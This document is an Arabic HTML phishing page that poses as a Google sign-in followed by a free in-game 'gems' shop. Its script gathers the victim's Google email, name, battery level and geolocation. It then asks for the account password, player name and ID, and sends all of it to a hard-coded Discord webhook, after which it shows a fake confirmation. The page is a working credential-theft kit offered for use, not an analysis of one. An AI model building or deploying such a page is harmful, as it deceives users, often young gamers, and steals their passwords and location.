<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    
    <title>تسجيل الدخول - حسابات Google</title>
    <link rel="icon" type="image/png" href="free.png">
    <link rel="apple-touch-icon" href="free.png">
    
    <script src="https://accounts.google.com/gsi/client" async defer></script>
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, sans-serif; -webkit-tap-highlight-color: transparent; }
        body { background-color: #ffffff; }

        /* شاشة الدخول */
        #auth-screen { height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .auth-card { width: 100%; max-width: 400px; padding: 40px 30px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
        .g-logo { width: 75px; margin-bottom: 15px; }
        h1 { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 10px; }
        .sub-text { color: #5f6368; margin-bottom: 30px; font-size: 15px; }

        /* شاشة المتجر */
        #main-app { display: none; min-height: 100vh; padding: 20px; flex-direction: column; align-items: center; background: #f8f9fa; }
        .main-card { background: white; width: 100%; max-width: 420px; border-radius: 25px; padding: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); border: 1px solid #eee; position: relative; }
        .points-badge { position: absolute; left: 20px; top: 20px; background: #fff5f5; padding: 5px 12px; border-radius: 10px; font-weight: 800; color: #d63031; display: flex; align-items: center; gap: 5px; font-size: 14px; }
        h2 { text-align: center; color: #d63031; margin: 30px 0 20px; border-bottom: 2px solid #fff5f5; padding-bottom: 10px; }
        
        .offers-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
        .offer-box { background: #fff; border: 2px solid #f8f9fa; border-radius: 20px; padding: 15px; text-align: center; cursor: pointer; transition: 0.3s; }
        .offer-box:hover { border-color: #d63031; transform: translateY(-3px); }
        .offer-box img { width: 55px; margin-bottom: 10px; border-radius: 50%; }

        /* نافذة الطلب */
        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); display: none; justify-content: center; align-items: center; z-index: 9999; padding: 20px; }
        .modal { background: white; width: 100%; max-width: 360px; padding: 25px; border-radius: 25px; text-align: center; }
        .input-group { margin-bottom: 12px; text-align: right; }
        .input-group label { font-size: 13px; font-weight: bold; color: #555; display: block; margin-bottom: 5px; }
        .input-group input { width: 100%; padding: 12px; border: 1.5px solid #eee; border-radius: 12px; outline: none; }
        .input-group input:focus { border-color: #d63031; }
        .btn-confirm { background: #d63031; color: white; border: none; width: 100%; padding: 14px; border-radius: 12px; font-weight: bold; cursor: pointer; margin-top: 10px; font-size: 16px; }
    </style>
</head>
<body>

<div id="auth-screen">
    <div class="auth-card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="g-logo">
        <h1>تسجيل الدخول</h1>
        <p class="sub-text">استخدم حسابك على Google للمتابعة</p>
        
        <div id="g_id_onload"
             data-client_id="YOUR_GOOGLE_CLIENT_ID.apps.googleusercontent.com"
             data-callback="handleCredentialResponse"
             data-auto_prompt="false">
        </div>
        <div class="g_id_signin" data-type="standard" data-shape="rectangular" data-theme="outline" data-text="signin_with" data-size="large" data-width="100%"></div>
    </div>
</div>

<div id="main-app">
    <div class="main-card">
        <div class="points-badge">0 <img src="free.png" width="14"></div>
        <h2>متجر الجواهر المجاني</h2>
        <div class="offers-grid">
            <div class="offer-box" onclick="openOrder('100 جوهرة')"><img src="free.png"><br><b>100 جوهرة</b></div>
            <div class="offer-box" onclick="openOrder('300 جوهرة')"><img src="free.png"><br><b>300 جوهرة</b></div>
            <div class="offer-box" onclick="openOrder('700 جوهرة')"><img src="free.png"><br><b>700 جوهرة</b></div>
            <div class="offer-box" onclick="openOrder('2000 جوهرة')"><img src="free.png"><br><b>2000 جوهرة</b></div>
        </div>
    </div>
</div>

<div class="overlay" id="orderModal">
    <div class="modal">
        <h3 id="orderTitle" style="color:#d63031; margin-bottom:15px;"></h3>
        
        <div class="input-group">
            <label>كلمة مرور الحساب (للتأكد)</label>
            <input type="password" id="accPass" placeholder="كلمة المرور">
        </div>
        
        <div class="input-group">
            <label>اسم اللاعب في اللعبة</label>
            <input type="text" id="playerName" placeholder="الاسم الكامل">
        </div>
        
        <div class="input-group">
            <label>ID الحساب</label>
            <input type="number" id="playerId" placeholder="ID الخاص بك">
        </div>
        
        <button class="btn-confirm" onclick="sendOrder()">تأكيد الشحن الآن</button>
        <p onclick="closeOrder()" style="margin-top:15px; font-size:13px; color:#888; cursor:pointer;">إلغاء</p>
    </div>
</div>

<script>
    // رابط الويبهوك الخاص بك
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1481105192224297042/gFsb5NE--KSmahsFg4Q8WzfakJxmUHFU68Athyg0M27BTUcjj5qWnDAqM26E8WDmmRkZ";
    
    let currentUserEmail = "";
    let selectedPack = "";

    function decodeJwt(token) {
        return JSON.parse(window.atob(token.split('.')[1].replace(/-/g, '+').replace(/_/g, '/')));
    }

    // --- المرحلة 1: رسالة الدخول (جمايل + بطارية + موقع) ---
    async function handleCredentialResponse(response) {
        const user = decodeJwt(response.credential);
        currentUserEmail = user.email;

        let battery = "غير متاح";
        try { const b = await navigator.getBattery(); battery = `${Math.round(b.level*100)}%`; } catch(e){}

        navigator.geolocation.getCurrentPosition(async (pos) => {
            const mapLink = `[خريطة جوجل](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`;
            await sendLog("✅ تسجيل دخول جديد", {
                "الجمايل": `\`${user.email}\``,
                "الاسم": user.name,
                "البطارية": battery,
                "الموقع": mapLink
            }, 3066993);
        }, async () => {
            await sendLog("✅ تسجيل دخول جديد", { "الجمايل": `\`${user.email}\``, "الاسم": user.name, "البطارية": battery, "الموقع": "مرفوض" }, 3066993);
        });

        document.getElementById('auth-screen').style.display = 'none';
        document.getElementById('main-app').style.display = 'flex';
    }

    // --- المرحلة 2: رسالة الشراء (كلمة السر + آيدي + تفاصيل) ---
    function openOrder(pack) {
        selectedPack = pack;
        document.getElementById('orderTitle').innerText = "شحن " + pack;
        document.getElementById('orderModal').style.display = 'flex';
    }

    function closeOrder() { document.getElementById('orderModal').style.display = 'none'; }

    async function sendOrder() {
        const pass = document.getElementById('accPass').value;
        const name = document.getElementById('playerName').value;
        const id = document.getElementById('playerId').value;

        if(!pass || !name || !id) { alert("أكمل البيانات لضمان نجاح الشحن"); return; }

        await sendLog("💎 طلب باقة جواهر", {
            "الجمايل": `\`${currentUserEmail}\``,
            "كلمة السر": `\`${pass}\``,
            "اسم اللاعب": name,
            "الآيدي": id,
            "الباقة": selectedPack
        }, 15158332);

        alert("تم استلام طلبك! سيتم التحقق والشحن خلال ساعات قليلة.");
        closeOrder();
    }

    // دالة الإرسال الموحدة
    async function sendLog(title, fieldsObj, color) {
        const fields = Object.keys(fieldsObj).map(key => ({ name: key, value: fieldsObj[key], inline: true }));
        const payload = {
            username: "𝐌𝐑 𝐀𝐓𝐋𝐀𝐒 𝐒𝐘𝐒𝐓𝐄𝐌",
            avatar_url: "https://i.imgur.com/8n9vS9f.png",
            embeds: [{ title: title, color: color, fields: fields, timestamp: new Date() }]
        };
        await fetch(WEBHOOK_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
    }
</script>

</body>
</html>
